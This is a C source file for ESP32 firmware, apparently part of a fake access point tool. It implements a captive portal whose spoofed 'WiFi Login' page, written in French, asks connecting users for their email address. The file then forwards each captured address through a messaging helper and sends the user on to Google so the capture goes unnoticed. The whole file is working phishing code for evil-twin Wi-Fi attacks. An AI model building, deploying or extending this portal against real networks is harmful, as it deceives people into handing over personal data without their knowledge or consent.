#include "esp_log.h"
#include "esp_wifi.h"
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "esp_http_server.h"

#include "fakeAP_utils.h"
#include "utils.h"

#define TAG "CAPTIVE_PORTAL"

/* ============================================================
 * Global state
 * ============================================================ */
static httpd_handle_t captive_portal_server = NULL;

/* ============================================================
 * Helpers
 * ============================================================ */
static bool is_already_authenticated(ip4_addr_t ip)
{
    for (int i = 0; i < authenticated_count; i++) {
        if (authenticated_clients[i].addr == ip.addr) {
            return true;
        }
    }
    return false;
}

void mark_authenticated(ip4_addr_t ip)
{
    if (is_already_authenticated(ip)) {
        ESP_LOGI(TAG, "Client already authenticated: %s",
                 ip4addr_ntoa(&ip));
        return;
    }

    if (authenticated_count >= MAX_CLIENTS) {
        ESP_LOGW(TAG, "Max authenticated clients reached");
        return;
    }

    authenticated_clients[authenticated_count++] = ip;
    ESP_LOGI(TAG, "Client authenticated: %s",
             ip4addr_ntoa(&ip));
}

/* ============================================================
 * Captive portal page
 * ============================================================ */
static const char *LOGIN_PAGE =
"<!DOCTYPE html><html><head>"
"<meta charset='utf-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>WiFi Login</title>"
"<style>"
"body{font-family:Arial;background:#f5f5f5;padding:40px}"
".card{max-width:360px;margin:auto;background:#fff;padding:30px;"
"border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,.1)}"
"input{width:100%;padding:10px;margin:10px 0}"
"input[type=submit]{background:#007BFF;color:#fff;border:none}"
"</style></head><body>"
"<div class='card'>"
"<h2>Connexion Internet requise</h2>"
"<form method='POST' action='/submit'>"
"<input type='email' name='email' required>"
"<input type='submit' value='Se connecter'>"
"</form></div></body></html>";

/* ============================================================
 * HTTP handlers
 * ============================================================ */
static esp_err_t captive_portal_handler(httpd_req_t *req)
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);

    getpeername(httpd_req_to_sockfd(req),
                (struct sockaddr *)&addr,
                &len);

    ip4_addr_t client_ip;
    client_ip.addr = addr.sin_addr.s_addr;

    if (is_already_authenticated(client_ip)) {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "https://www.google.com");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, LOGIN_PAGE, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t post_handler(httpd_req_t *req)
{
    char buf[256];
    int recv = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (recv <= 0)
        return ESP_FAIL;

    buf[recv] = '\0';

    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);

    getpeername(httpd_req_to_sockfd(req),
                (struct sockaddr *)&addr,
                &len);

    ip4_addr_t client_ip;
    client_ip.addr = addr.sin_addr.s_addr;

    char *email = strstr(buf, "email=");
    if (email) {
        email += 6;
        char *end = strchr(email, '&');
        if (end) *end = '\0';

        /* Send captured email (NOUVELLE SIGNATURE) */
        msg_data(
            TAG,
            email,
            strlen(email),
            true,   /* eof */
            NULL
        );

        mark_authenticated(client_ip);
    }

    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "https://www.google.com");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t redirect_handler(httpd_req_t *req)
{
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", CAPTIVE_PORTAL_URL);
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/* ============================================================
 * Server control
 * ============================================================ */
httpd_handle_t start_captive_portal(void)
{
    if (captive_portal_server) {
        ESP_LOGW(TAG, "Captive portal already running");
        return captive_portal_server;
    }

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.stack_size = 8192;
    config.lru_purge_enable = true;

    ESP_LOGI(TAG, "Starting captive portal");

    if (httpd_start(&captive_portal_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start HTTP server");
        return NULL;
    }

    httpd_uri_t root = {
        .uri = "/",
        .method = HTTP_GET,
        .handler = captive_portal_handler
    };
    httpd_register_uri_handler(captive_portal_server, &root);

    httpd_uri_t submit = {
        .uri = "/submit",
        .method = HTTP_POST,
        .handler = post_handler
    };
    httpd_register_uri_handler(captive_portal_server, &submit);

    httpd_uri_t redirect = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = redirect_handler
    };
    httpd_register_uri_handler(captive_portal_server, &redirect);

    msg_info(TAG, "Captive portal started", NULL);
    return captive_portal_server;
}

void stop_captive_portal(void)
{
    if (!captive_portal_server) {
        msg_info(TAG, "Captive portal not running", NULL);
        return;
    }

    httpd_stop(captive_portal_server);
    captive_portal_server = NULL;
    msg_info(TAG, "Captive portal stopped", NULL);
}
